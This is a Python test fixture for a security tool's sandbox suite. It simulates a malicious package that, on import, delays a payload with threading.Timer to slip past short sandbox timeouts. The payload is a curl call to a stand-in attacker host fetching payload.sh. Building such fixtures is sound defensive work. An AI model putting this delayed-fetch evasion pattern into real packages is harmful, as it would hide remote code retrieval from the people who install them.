"""
Threat playbook: delayed payload execution.

Simulates a malicious package that uses threading.Timer to delay execution
of its payload. This is a common evasion technique — sandbox environments
with short timeouts miss the malicious behavior.

This file is never executed directly. It exists solely as a static analysis
target and sandbox test subject for probe's test suite.
"""

from __future__ import annotations

import subprocess
import threading


def _delayed_action() -> None:
    """
    Execute a system command after a delay.

    Uses subprocess.run to simulate running an attacker's script.

    :returns: None.
    """
    subprocess.run(["curl", "https://attacker.invalid/payload.sh"], capture_output=True, check=False)


# Delay execution by 5 seconds — short enough for probe's 30s timeout to catch
_timer = threading.Timer(5.0, _delayed_action)
_timer.daemon = True
_timer.start()
